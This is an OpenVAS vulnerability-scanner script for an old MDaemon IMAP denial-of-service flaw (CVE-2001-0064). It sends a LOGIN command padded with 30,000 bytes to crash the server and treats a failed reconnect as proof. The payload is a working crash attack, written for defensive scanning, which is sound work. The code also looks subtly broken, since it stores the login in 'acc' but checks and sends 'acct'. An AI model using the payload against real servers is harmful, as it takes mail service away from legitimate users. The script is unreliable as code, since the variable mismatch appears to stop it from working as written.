# OpenVAS Vulnerability Test
# $Id: mdaemon_imap_server_dos.nasl 13409 2019-02-01 13:13:33Z cfischer $
# Description: MDaemon IMAP Server DoS
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
# based on work from (C) Tenable Network Security
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

#  Ref: Peter <peter.grundl@defcom.com>

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14826");
  script_version("$Revision: 13409 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-01 14:13:33 +0100 (Fri, 01 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(2134);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2001-0064");
  script_name("MDaemon IMAP Server DoS");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2004 David Maciejak");
  script_family("Denial of Service");
  script_dependencies("imap4_banner.nasl", "logins.nasl");
  script_require_ports("Services/imap", 143);
  script_mandatory_keys("imap/mdaemon/detected", "imap/login", "imap/password");

  script_tag(name:"solution", value:"Upgrade to the newest version of this software.");

  script_tag(name:"summary", value:"The remote host is running the MDaemon IMAP server.

  It is possible to crash the remote version of this softare sending a long
  argument to the 'LOGIN' command.");

  script_tag(name:"impact", value:"This problem allows an attacker to make the remote service
  crash, thus preventing legitimate users from receiving e-mails.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("imap_func.inc");

kb_creds = imap_get_kb_creds();
acc = kb_creds["login"];
pass = kb_creds["pass"];
if(!acct || !pass)
  exit(0);

port = get_imap_port(default:143);
soc = open_sock_tcp(port);
if(!soc)
  exit(0);

banner = recv_line(socket:soc, length:4096);
if(! banner || "MDaemon" >!< banner) {
  close(soc);
  exit(0);
}

s = string("? LOGIN ", acct, " ", pass, " ", crap(30000), "\r\n");
send(socket:soc, data:s);
d = recv_line(socket:soc, length:4096);
close(soc);

soc2 = open_sock_tcp(port);
if(!soc2) {
  security_message(port);
  exit(0);
}

close(soc2);
exit(99);